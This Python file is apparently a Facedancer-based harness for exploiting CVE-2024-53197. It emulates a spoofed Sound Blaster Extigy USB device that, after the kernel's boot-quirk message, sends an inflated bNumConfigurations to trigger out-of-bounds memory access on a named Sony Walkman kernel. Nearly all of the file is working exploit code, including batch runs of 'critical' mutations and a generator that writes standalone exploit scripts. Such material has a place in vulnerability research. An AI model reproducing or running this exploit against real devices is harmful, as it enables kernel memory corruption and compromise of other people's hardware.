#!/usr/bin/env python3
"""
Facedancer USB Fuzzing Harness for CVE-2024-53197

Uses Facedancer (GreatFET/Cynthion) to emulate malicious USB Audio devices
and exploit the snd_usb_extigy_boot_quirk vulnerability.

Target: Sony NW-A306 Walkman (kernel 4.19.157)

USAGE:
    python3 facedancer_harness.py --mutation MUT-0001
    python3 facedancer_harness.py --batch-critical

REQUIREMENTS:
    - GreatFET One, Cynthion, or compatible Facedancer hardware
    - facedancer Python package (pip install facedancer)
    - USB connection to target device
"""

import argparse
import json
import struct
import time
import sys
import logging
from pathlib import Path
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from datetime import datetime
from enum import Enum

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s'
)
logger = logging.getLogger(__name__)

# Try to import Facedancer - may not be available on all systems
try:
    from facedancer import *
    from facedancer.devices.base import USBBaseDevice
    from facedancer.descriptor import DeviceDescriptor, ConfigurationDescriptor
    FACEDANCER_AVAILABLE = True
except ImportError:
    FACEDANCER_AVAILABLE = False
    logger.warning("Facedancer library not available - running in simulation mode")


class QuirkPhase(Enum):
    """Phases of the Extigy boot quirk attack"""
    INITIAL = "initial"
    QUIRK_TRIGGERED = "quirk_triggered"
    DESCRIPTOR_SENT = "descriptor_sent"
    ATTACK_COMPLETE = "attack_complete"


@dataclass
class AttackState:
    """Tracks attack progress"""
    phase: QuirkPhase = QuirkPhase.INITIAL
    boot_quirk_received: bool = False
    malicious_descriptor_sent: bool = False
    target_bnum_configurations: int = 255
    original_bnum_configurations: int = 1
    descriptor_requests: int = 0
    control_messages: List[Dict] = None

    def __post_init__(self):
        if self.control_messages is None:
            self.control_messages = []


class ExtigyBootQuirkDetector:
    """
    Detects the Extigy boot quirk control message

    The quirk sends:
        bRequest = 0x10
        bmRequestType = 0x43
        wValue = 0x0001
        wIndex = 0x000a
    """

    QUIRK_REQUEST = 0x10
    QUIRK_REQUEST_TYPE = 0x43
    QUIRK_VALUE = 0x0001
    QUIRK_INDEX = 0x000a

    @classmethod
    def is_boot_quirk(cls, request: int, request_type: int,
                      value: int, index: int) -> bool:
        """Check if control message is the boot quirk trigger"""
        return (
            request == cls.QUIRK_REQUEST and
            request_type == cls.QUIRK_REQUEST_TYPE and
            value == cls.QUIRK_VALUE and
            index == cls.QUIRK_INDEX
        )


class MaliciousExtigyDevice:
    """
    Malicious Creative Extigy USB Audio device emulator

    Exploits CVE-2024-53197 by returning inflated bNumConfigurations
    after the boot quirk control message is received.
    """

    # Firmware sizes that trigger the quirk
    FIRMWARE_SIZE_OLD = 794
    FIRMWARE_SIZE_NEW = 483

    def __init__(self, mutation: Dict):
        self.mutation = mutation
        self.state = AttackState()

        # Parse mutation parameters
        self._parse_mutation()

    def _parse_mutation(self):
        """Parse mutation template into attack parameters"""
        dev_desc = self.mutation.get('device_descriptor', {})
        post_desc = self.mutation.get('post_quirk_descriptor', dev_desc)
        config_desc = self.mutation.get('config_descriptor', {})

        # VID/PID
        self.vid = self._parse_hex(dev_desc.get('idVendor', '0x041e'))
        self.pid = self._parse_hex(dev_desc.get('idProduct', '0x3000'))

        # bNumConfigurations (the key exploit parameter)
        self.state.original_bnum_configurations = dev_desc.get('bNumConfigurations', 1)
        self.state.target_bnum_configurations = post_desc.get('bNumConfigurations', 255)

        # wTotalLength (triggers quirk detection)
        self.wTotalLength = config_desc.get('wTotalLength', self.FIRMWARE_SIZE_OLD)

        # Calculate expected OOB
        self.oob_size = (
            self.state.target_bnum_configurations -
            self.state.original_bnum_configurations
        ) * 272

        logger.info(f"Attack parameters:")
        logger.info(f"  VID:PID = 0x{self.vid:04x}:0x{self.pid:04x}")
        logger.info(f"  Initial bNumConfigurations = {self.state.original_bnum_configurations}")
        logger.info(f"  Malicious bNumConfigurations = {self.state.target_bnum_configurations}")
        logger.info(f"  Expected OOB = {self.oob_size} bytes")

    def _parse_hex(self, value) -> int:
        """Parse hex string or int"""
        if isinstance(value, str):
            return int(value, 16)
        return value

    def build_device_descriptor(self) -> bytes:
        """
        Build USB device descriptor

        Returns malicious bNumConfigurations after boot quirk is triggered
        """
        # Choose bNumConfigurations based on attack phase
        if self.state.boot_quirk_received:
            bnum = self.state.target_bnum_configurations
            logger.info(f"[ATTACK] Sending MALICIOUS descriptor: bNumConfigurations={bnum}")
            self.state.malicious_descriptor_sent = True
            self.state.phase = QuirkPhase.DESCRIPTOR_SENT
        else:
            bnum = self.state.original_bnum_configurations
            logger.debug(f"Sending initial descriptor: bNumConfigurations={bnum}")

        return struct.pack(
            '<BBHBBBBHHHBBBB',
            18,             # bLength
            0x01,           # bDescriptorType (DEVICE)
            0x0200,         # bcdUSB (USB 2.0)
            0x00,           # bDeviceClass
            0x00,           # bDeviceSubClass
            0x00,           # bDeviceProtocol
            64,             # bMaxPacketSize0
            self.vid,       # idVendor
            self.pid,       # idProduct
            0x0100,         # bcdDevice
            1,              # iManufacturer
            2,              # iProduct
            3,              # iSerialNumber
            bnum            # bNumConfigurations *** EXPLOIT FIELD ***
        )

    def build_config_descriptor(self) -> bytes:
        """
        Build USB configuration descriptor

        wTotalLength must match firmware size constants to trigger quirk
        """
        # Build basic config descriptor (9 bytes)
        config = struct.pack(
            '<BBHBBBBB',
            9,                   # bLength
            0x02,                # bDescriptorType (CONFIGURATION)
            self.wTotalLength,   # wTotalLength (triggers quirk!)
            1,                   # bNumInterfaces
            1,                   # bConfigurationValue
            0,                   # iConfiguration
            0xC0,                # bmAttributes (self-powered)
            250                  # bMaxPower (500mA)
        )

        # Audio Control Interface (9 bytes)
        interface = struct.pack(
            '<BBBBBBBBB',
            9,      # bLength
            0x04,   # bDescriptorType (INTERFACE)
            0,      # bInterfaceNumber
            0,      # bAlternateSetting
            0,      # bNumEndpoints
            0x01,   # bInterfaceClass (Audio)
            0x01,   # bInterfaceSubClass (Audio Control)
            0x00,   # bInterfaceProtocol
            0       # iInterface
        )

        # Pad to match wTotalLength
        total = config + interface
        padding_needed = self.wTotalLength - len(total)
        if padding_needed > 0:
            total += bytes(padding_needed)

        return total

    def build_string_descriptor(self, index: int) -> bytes:
        """Build USB string descriptor"""
        strings = {
            0: b'\x04\x03\x09\x04',  # Language ID (English US)
            1: "Creative Technology",
            2: "Sound Blaster Extigy",
            3: f"EXPLOIT-{self.mutation['id']}"
        }

        if index == 0:
            return strings[0]

        if index in strings:
            s = strings[index]
            encoded = s.encode('utf-16-le')
            return struct.pack('<BB', len(encoded) + 2, 0x03) + encoded

        return struct.pack('<BB', 2, 0x03)  # Empty string

    def handle_control_request(self, request_type: int, request: int,
                               value: int, index: int, length: int) -> Optional[bytes]:
        """
        Handle USB control request

        Detects boot quirk and returns appropriate descriptors
        """
        self.state.control_messages.append({
            "request_type": request_type,
            "request": request,
            "value": value,
            "index": index,
            "length": length,
            "timestamp": time.time()
        })

        # Check for boot quirk trigger
        if ExtigyBootQuirkDetector.is_boot_quirk(request, request_type, value, index):
            logger.warning("=" * 60)
            logger.warning("[BOOT QUIRK TRIGGERED!]")
            logger.warning(f"  bRequest=0x{request:02x}, bmRequestType=0x{request_type:02x}")
            logger.warning(f"  wValue=0x{value:04x}, wIndex=0x{index:04x}")
            logger.warning("=" * 60)

            self.state.boot_quirk_received = True
            self.state.phase = QuirkPhase.QUIRK_TRIGGERED

            # Acknowledge the request
            return b''

        # GET_DESCRIPTOR request
        if request_type == 0x80 and request == 0x06:
            descriptor_type = (value >> 8) & 0xFF
            descriptor_index = value & 0xFF

            self.state.descriptor_requests += 1

            if descriptor_type == 0x01:  # DEVICE
                return self.build_device_descriptor()
            elif descriptor_type == 0x02:  # CONFIGURATION
                return self.build_config_descriptor()
            elif descriptor_type == 0x03:  # STRING
                return self.build_string_descriptor(descriptor_index)

        return None

    def get_attack_summary(self) -> Dict[str, Any]:
        """Get summary of attack state"""
        return {
            "mutation_id": self.mutation['id'],
            "mutation_name": self.mutation['name'],
            "phase": self.state.phase.value,
            "boot_quirk_received": self.state.boot_quirk_received,
            "malicious_descriptor_sent": self.state.malicious_descriptor_sent,
            "original_bnum": self.state.original_bnum_configurations,
            "target_bnum": self.state.target_bnum_configurations,
            "oob_size": self.oob_size,
            "descriptor_requests": self.state.descriptor_requests,
            "control_messages_count": len(self.state.control_messages)
        }


if FACEDANCER_AVAILABLE:

    class FacedancerExtigyDevice(USBBaseDevice):
        """
        Facedancer implementation of malicious Extigy device

        This class integrates with the actual Facedancer library
        """

        def __init__(self, mutation: Dict):
            self.exploit = MaliciousExtigyDevice(mutation)

            # Initialize base device
            super().__init__(
                vendor_id=self.exploit.vid,
                product_id=self.exploit.pid,
                device_rev=0x0100,
                manufacturer_string="Creative Technology",
                product_string="Sound Blaster Extigy",
                serial_number_string=f"EXPLOIT-{mutation['id']}"
            )

        def handle_request(self, request):
            """Override to handle control requests"""
            response = self.exploit.handle_control_request(
                request.request_type,
                request.request,
                request.value,
                request.index,
                request.length
            )

            if response is not None:
                self.send_on_endpoint_zero(response)
                return

            # Fall through to default handling
            super().handle_request(request)

        def get_device_descriptor(self):
            """Override device descriptor"""
            return self.exploit.build_device_descriptor()

        def get_configuration_descriptor(self, index):
            """Override configuration descriptor"""
            return self.exploit.build_config_descriptor()


class FacedancerFuzzer:
    """
    Fuzzing harness using Facedancer hardware

    Manages mutation testing through Facedancer-controlled USB device emulation
    """

    def __init__(self, mutations_file: str = "all_mutations.json"):
        self.mutations: List[Dict] = []
        self.mutations_file = mutations_file
        self.results: List[Dict] = []

        self.load_mutations()

    def load_mutations(self):
        """Load mutation templates"""
        if not Path(self.mutations_file).exists():
            logger.error(f"Mutations file not found: {self.mutations_file}")
            return

        with open(self.mutations_file, 'r') as f:
            data = json.load(f)
            self.mutations = data.get('mutations', [])

        logger.info(f"Loaded {len(self.mutations)} mutations")

    def get_mutation(self, mutation_id: str) -> Optional[Dict]:
        """Get mutation by ID"""
        for m in self.mutations:
            if m['id'] == mutation_id:
                return m
        return None

    def get_critical_mutations(self) -> List[Dict]:
        """Get critical severity mutations"""
        return [m for m in self.mutations if m.get('severity') == 'critical']

    def run_mutation(self, mutation: Dict, timeout_seconds: int = 30) -> Dict:
        """
        Run a single mutation test

        Returns result dictionary
        """
        result = {
            "mutation_id": mutation['id'],
            "mutation_name": mutation['name'],
            "timestamp": datetime.now().isoformat(),
            "timeout_seconds": timeout_seconds,
            "outcome": "unknown",
            "attack_summary": None,
            "notes": []
        }

        logger.info("=" * 60)
        logger.info(f"Testing mutation: {mutation['name']}")
        logger.info(f"Type: {mutation.get('mutation_type')}")
        logger.info(f"Severity: {mutation.get('severity')}")
        logger.info(f"Expected: {mutation.get('expected_impact')}")
        logger.info("=" * 60)

        if not FACEDANCER_AVAILABLE:
            logger.warning("Running in SIMULATION mode (no Facedancer hardware)")

            # Simulate attack flow
            exploit = MaliciousExtigyDevice(mutation)

            logger.info("\n[SIMULATION] Simulating USB enumeration flow...")
            time.sleep(1)

            # Simulate initial enumeration
            logger.info("[SIM] Host requests device descriptor...")
            desc = exploit.handle_control_request(0x80, 0x06, 0x0100, 0, 18)
            logger.info(f"[SIM] Sent descriptor with bNumConfigurations={exploit.state.original_bnum_configurations}")

            time.sleep(0.5)

            # Simulate config descriptor (triggers quirk detection)
            logger.info("[SIM] Host requests configuration descriptor...")
            exploit.handle_control_request(0x80, 0x06, 0x0200, 0, 9)
            logger.info(f"[SIM] Sent config with wTotalLength={exploit.wTotalLength}")

            time.sleep(0.5)

            # Simulate boot quirk
            logger.info("\n[SIM] Simulating boot quirk control message...")
            exploit.handle_control_request(0x43, 0x10, 0x0001, 0x000a, 0)

            time.sleep(0.5)

            # Simulate re-enumeration with malicious descriptor
            logger.info("[SIM] Host re-requests device descriptor (post-quirk)...")
            desc = exploit.handle_control_request(0x80, 0x06, 0x0100, 0, 18)

            result["attack_summary"] = exploit.get_attack_summary()
            result["outcome"] = "simulated"
            result["notes"].append("Simulation completed - requires Facedancer hardware for real attack")

            self.results.append(result)
            return result

        # Real Facedancer execution
        try:
            logger.info("Initializing Facedancer hardware...")

            # Create device
            device = FacedancerExtigyDevice(mutation)

            logger.info("Connecting USB device...")
            device.connect()

            logger.info(f"Device active - waiting {timeout_seconds}s for attack...")
            logger.info("Connect target device now!")
            logger.info("")
            logger.info("Watching for boot quirk trigger...")

            start_time = time.time()
            while time.time() - start_time < timeout_seconds:
                device.service()

                # Check if attack completed
                if device.exploit.state.malicious_descriptor_sent:
                    logger.info("\n[SUCCESS] Malicious descriptor sent!")
                    result["outcome"] = "attack_sent"
                    break

                time.sleep(0.01)

            result["attack_summary"] = device.exploit.get_attack_summary()

            if not device.exploit.state.boot_quirk_received:
                result["outcome"] = "no_quirk_trigger"
                result["notes"].append("Boot quirk was not triggered - check VID:PID and wTotalLength")
            elif not device.exploit.state.malicious_descriptor_sent:
                result["outcome"] = "quirk_only"
                result["notes"].append("Quirk triggered but descriptor not re-requested")

        except KeyboardInterrupt:
            logger.info("Test interrupted")
            result["outcome"] = "interrupted"

        except Exception as e:
            logger.error(f"Error: {e}")
            result["outcome"] = "error"
            result["notes"].append(str(e))

        finally:
            if FACEDANCER_AVAILABLE:
                try:
                    device.disconnect()
                except:
                    pass

        self.results.append(result)
        return result

    def run_batch(self, mutations: List[Dict], timeout_each: int = 30):
        """Run multiple mutations in sequence"""
        logger.info(f"Starting batch of {len(mutations)} mutations")

        for i, mutation in enumerate(mutations, 1):
            logger.info(f"\n{'#'*60}")
            logger.info(f"# Mutation {i}/{len(mutations)}")
            logger.info(f"{'#'*60}")

            result = self.run_mutation(mutation, timeout_each)

            if result["outcome"] == "interrupted":
                break

            # Pause between tests
            time.sleep(3)

        logger.info(f"\nBatch complete: {len(self.results)} tests")

    def export_results(self, filepath: str = "facedancer_results.json"):
        """Export results to JSON"""
        data = {
            "session_time": datetime.now().isoformat(),
            "facedancer_available": FACEDANCER_AVAILABLE,
            "total_tests": len(self.results),
            "results": self.results
        }

        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)

        logger.info(f"Results exported to {filepath}")

    def generate_standalone_script(self, mutation: Dict) -> str:
        """Generate standalone Facedancer script for a mutation"""
        dev_desc = mutation.get('device_descriptor', {})
        post_desc = mutation.get('post_quirk_descriptor', dev_desc)
        config_desc = mutation.get('config_descriptor', {})

        vid = dev_desc.get('idVendor', '0x041e')
        pid = dev_desc.get('idProduct', '0x3000')
        initial_bnum = dev_desc.get('bNumConfigurations', 1)
        post_bnum = post_desc.get('bNumConfigurations', 255)
        wTotalLength = config_desc.get('wTotalLength', 794)

        if isinstance(vid, int):
            vid = f"0x{vid:04x}"
        if isinstance(pid, int):
            pid = f"0x{pid:04x}"

        script = f'''#!/usr/bin/env python3
"""
CVE-2024-53197 Facedancer Exploit
Mutation: {mutation['id']} - {mutation['name']}
Severity: {mutation.get('severity', 'unknown')}

Target: Sony NW-A306 Walkman (kernel 4.19.157)
Expected Impact: {mutation.get('expected_impact', 'OOB access')}

USAGE: python3 {mutation['id']}_exploit.py
"""

import struct
import time

from facedancer import *
from facedancer.devices.base import USBBaseDevice


class MaliciousExtigy(USBBaseDevice):
    """
    Malicious Creative Extigy emulator

    Exploits CVE-2024-53197 by returning inflated bNumConfigurations
    after boot quirk is triggered.
    """

    # Device identification
    VENDOR_ID = {vid}
    PRODUCT_ID = {pid}

    # Exploit parameters
    INITIAL_BNUM_CONFIGURATIONS = {initial_bnum}
    MALICIOUS_BNUM_CONFIGURATIONS = {post_bnum}
    TRIGGER_WTOTALLENGTH = {wTotalLength}

    # Boot quirk signature
    QUIRK_REQUEST = 0x10
    QUIRK_REQUEST_TYPE = 0x43
    QUIRK_VALUE = 0x0001
    QUIRK_INDEX = 0x000a

    def __init__(self):
        super().__init__(
            vendor_id=self.VENDOR_ID,
            product_id=self.PRODUCT_ID,
            device_rev=0x0100,
            manufacturer_string="Creative Technology",
            product_string="Sound Blaster Extigy",
            serial_number_string="EXPLOIT-{mutation['id']}"
        )

        self.boot_quirk_triggered = False
        self.oob_size = (self.MALICIOUS_BNUM_CONFIGURATIONS - self.INITIAL_BNUM_CONFIGURATIONS) * 272

        print(f"[*] Exploit parameters:")
        print(f"    VID:PID = {{self.VENDOR_ID}}:{{self.PRODUCT_ID}}")
        print(f"    Initial bNumConfigurations = {{self.INITIAL_BNUM_CONFIGURATIONS}}")
        print(f"    Malicious bNumConfigurations = {{self.MALICIOUS_BNUM_CONFIGURATIONS}}")
        print(f"    Expected OOB = {{self.oob_size}} bytes")
        print()

    def handle_request(self, request):
        """Handle USB control requests"""

        # Check for boot quirk
        if (request.request == self.QUIRK_REQUEST and
            request.request_type == self.QUIRK_REQUEST_TYPE and
            request.value == self.QUIRK_VALUE and
            request.index == self.QUIRK_INDEX):

            print()
            print("!" * 60)
            print("[BOOT QUIRK TRIGGERED!]")
            print(f"  bRequest=0x{{request.request:02x}}")
            print(f"  bmRequestType=0x{{request.request_type:02x}}")
            print(f"  wValue=0x{{request.value:04x}}")
            print(f"  wIndex=0x{{request.index:04x}}")
            print("!" * 60)
            print()

            self.boot_quirk_triggered = True
            self.send_on_endpoint_zero(b'')
            return

        super().handle_request(request)

    def get_device_descriptor(self):
        """Return device descriptor with conditional bNumConfigurations"""

        if self.boot_quirk_triggered:
            bnum = self.MALICIOUS_BNUM_CONFIGURATIONS
            print(f"[ATTACK] Sending MALICIOUS descriptor: bNumConfigurations={{bnum}}")
            print(f"[ATTACK] This will cause {{self.oob_size}} bytes OOB access!")
        else:
            bnum = self.INITIAL_BNUM_CONFIGURATIONS
            print(f"[*] Sending initial descriptor: bNumConfigurations={{bnum}}")

        return struct.pack(
            '<BBHBBBBHHHBBBB',
            18,                     # bLength
            0x01,                   # bDescriptorType
            0x0200,                 # bcdUSB
            0x00,                   # bDeviceClass
            0x00,                   # bDeviceSubClass
            0x00,                   # bDeviceProtocol
            64,                     # bMaxPacketSize0
            self.VENDOR_ID,         # idVendor
            self.PRODUCT_ID,        # idProduct
            0x0100,                 # bcdDevice
            1, 2, 3,                # iManufacturer, iProduct, iSerialNumber
            bnum                    # bNumConfigurations *** EXPLOIT ***
        )

    def get_configuration_descriptor(self, index):
        """Return configuration descriptor with quirk trigger size"""

        config = struct.pack(
            '<BBHBBBBB',
            9,                          # bLength
            0x02,                       # bDescriptorType
            self.TRIGGER_WTOTALLENGTH,  # wTotalLength (triggers quirk)
            1, 1, 0, 0xC0, 250
        )

        interface = struct.pack(
            '<BBBBBBBBB',
            9, 0x04, 0, 0, 0, 0x01, 0x01, 0x00, 0
        )

        # Pad to wTotalLength
        result = config + interface
        padding = self.TRIGGER_WTOTALLENGTH - len(result)
        if padding > 0:
            result += bytes(padding)

        return result


def main():
    print("=" * 60)
    print("CVE-2024-53197 Facedancer Exploit")
    print("Mutation: {mutation['id']} - {mutation['name']}")
    print("=" * 60)
    print()

    print("[*] Initializing Facedancer...")
    device = MaliciousExtigy()

    print("[*] Connecting USB device...")
    device.connect()

    print("[*] Device active - connect target device now!")
    print("[*] Watching for boot quirk...")
    print()

    try:
        while True:
            device.service()
            time.sleep(0.001)
    except KeyboardInterrupt:
        print("\\n[*] Stopped by user")
    finally:
        device.disconnect()


if __name__ == "__main__":
    main()
'''

        return script


def main():
    parser = argparse.ArgumentParser(
        description='CVE-2024-53197 Facedancer Fuzzing Harness'
    )
    parser.add_argument(
        '--mutation', '-m',
        help='Mutation ID to test'
    )
    parser.add_argument(
        '--timeout', '-t',
        type=int,
        default=30,
        help='Timeout per test in seconds (default: 30)'
    )
    parser.add_argument(
        '--batch-critical',
        action='store_true',
        help='Run all critical mutations'
    )
    parser.add_argument(
        '--generate-script',
        metavar='MUTATION_ID',
        help='Generate standalone Facedancer script for mutation'
    )
    parser.add_argument(
        '--list',
        action='store_true',
        help='List available mutations'
    )
    parser.add_argument(
        '--mutations-file',
        default='all_mutations.json',
        help='Mutations JSON file'
    )

    args = parser.parse_args()

    fuzzer = FacedancerFuzzer(args.mutations_file)

    # List mutations
    if args.list:
        print(f"\nMutations: {len(fuzzer.mutations)}")
        print("-" * 60)
        critical = [m for m in fuzzer.mutations if m.get('severity') == 'critical']
        print(f"\nCritical ({len(critical)}):")
        for m in critical[:20]:
            print(f"  {m['id']:12} {m['name']}")
        return

    # Generate standalone script
    if args.generate_script:
        mutation = fuzzer.get_mutation(args.generate_script)
        if not mutation:
            print(f"Mutation not found: {args.generate_script}")
            sys.exit(1)

        script = fuzzer.generate_standalone_script(mutation)
        filename = f"{args.generate_script}_exploit.py"

        with open(filename, 'w') as f:
            f.write(script)

        print(f"Generated: {filename}")
        return

    # Batch critical
    if args.batch_critical:
        mutations = fuzzer.get_critical_mutations()[:10]  # Limit to 10
        fuzzer.run_batch(mutations, args.timeout)
        fuzzer.export_results()
        return

    # Single mutation
    if args.mutation:
        mutation = fuzzer.get_mutation(args.mutation)
        if not mutation:
            print(f"Mutation not found: {args.mutation}")
            sys.exit(1)

        fuzzer.run_mutation(mutation, args.timeout)
        fuzzer.export_results()
        return

    parser.print_help()


if __name__ == "__main__":
    main()
